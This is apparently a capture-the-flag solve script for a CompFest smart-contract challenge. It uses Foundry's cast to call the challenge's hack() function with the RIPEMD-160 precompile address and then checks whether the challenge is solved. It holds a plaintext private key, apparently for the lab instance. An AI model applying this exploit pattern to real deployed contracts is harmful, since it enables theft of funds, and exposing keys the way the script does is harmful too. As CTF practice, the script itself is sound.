export RPC_URL="http://ctf.compfest.id:7402/0edc96dc-a370-4afd-a348-ed247c7a6abe"
export PK="0x9ccffa6e4dc97239720a3b385b5193d8cd7940b6eb6b4e3de74b0886249a0d07"
SETUP=0x254D08bE18257197Bba7646629B156347A321B98
RIPEMD=0x0000000000000000000000000000000000000003
SIG_CHALLENGE="function challenge() view returns (address)"
SIG_ISSOLVED="function isSolved() view returns (bool)"
SIG_HACK="function hack(address _contract)"
CHAL=$(cast call --rpc-url $RPC_URL $SETUP "$SIG_CHALLENGE")
echo "challenge: $CHAL"
cast send --rpc-url $RPC_URL --private-key $PK $CHAL "$SIG_HACK" $RIPEMD
cast call --rpc-url $RPC_URL $CHAL "$SIG_ISSOLVED"
cast call --rpc-url $RPC_URL $SETUP "$SIG_ISSOLVED"
